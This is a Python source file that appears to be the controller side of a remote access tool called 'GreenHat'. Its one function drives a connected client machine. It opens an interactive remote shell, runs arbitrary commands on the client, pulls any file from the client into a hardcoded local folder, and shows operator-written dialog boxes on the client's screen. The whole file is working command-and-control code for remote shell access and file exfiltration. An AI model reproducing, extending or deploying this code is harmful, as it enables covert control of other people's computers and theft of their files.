import constants
import os


def connect_to_client(self_, client_uid):

    if client_uid not in self_.conn_list:
        print("No client with this client ID!")
        return

    client_comp_name = self_.client_details[client_uid]["name"]
    client_sock = self_.conn_list[client_uid]
    self_.connected_client = client_sock

    self_.is_conn_established = True
    self_.default_text = constants.DEFAULT_TEXT + "/" + client_comp_name + "> "

    while True:
        if not self_.is_conn_established:
            break

        print(self_.default_text, end="")
        get_cmd_input = input("")

        if get_cmd_input == "shell":
            client_sock.send("getshell".encode())
            getcwd = client_sock.recv(1024).decode()
            self_.default_text = constants.DEFAULT_TEXT + " " + getcwd + "> "
            while True:
                if not self_.is_conn_established:
                    break

                print(self_.default_text, end="")
                get_cmd_input_shell = input("")
                if get_cmd_input_shell[0:4] == "exit":
                    client_sock.send("exit".encode())
                    self_.default_text = (
                        constants.DEFAULT_TEXT + "/" + client_comp_name + "> "
                    )
                    break
                elif get_cmd_input_shell[:2] == "cd":
                    client_sock.send(get_cmd_input_shell.encode())
                    out = client_sock.recv(2048).decode()
                    if out == "error":
                        print("This Directory does'nt exists.")
                    else:
                        self_.default_text = out + "> "
                elif get_cmd_input_shell[1:2] == ":":
                    client_sock.send(get_cmd_input_shell.encode())
                    out = client_sock.recv(2048).decode()
                    if out == "error":
                        print("This Directory does'nt exists.")
                    else:
                        self_.default_text = out + "> "
                elif get_cmd_input_shell == "cls" or get_cmd_input_shell == "clear":
                    os.system("cls" if os.name == "nt" else "clear")
                else:
                    client_sock.send(get_cmd_input_shell.encode())
                    std_shell_out = client_sock.recv(90000)
                    print(std_shell_out.decode())

        elif get_cmd_input[0:8] == "download":
            client_sock.send("download".encode())
            path = get_cmd_input[9:]
            filename = os.path.basename(path)
            client_sock.send(path.encode())

            getd = client_sock.recv(2048).decode()

            if getd == "error":
                print("The file doesn't exits.")
            else:
                getdata = client_sock.recv(99999)
                totalRecv = len(getdata)
                with open("F:\\algorithms practice\\GreenHat\\" + filename, "wb") as f:
                    f.write(getdata)

        elif get_cmd_input == "status":
            print("You are currently connected to " + client_comp_name + "'s computer")

        elif get_cmd_input == "disconnect" or get_cmd_input == "exit":
            self_.default_text = constants.DEFAULT_TEXT
            break

        elif get_cmd_input == "show_dialog":
            client_sock.send("show_dialog".encode())
            title = input("Title for the dialog: ")
            client_sock.send(title.encode())
            box_content = input("Content for the dialog: ")
            client_sock.send(box_content.encode())

        elif get_cmd_input == "help":
            print("All the current supported commands - \n")
            for i, cmds in enumerate(self_.conn_cmds):
                print(str(i) + ".", str(cmds), "-", self_.conn_cmds[cmds])

            print("\n")

        else:
            print("Wrong Command")
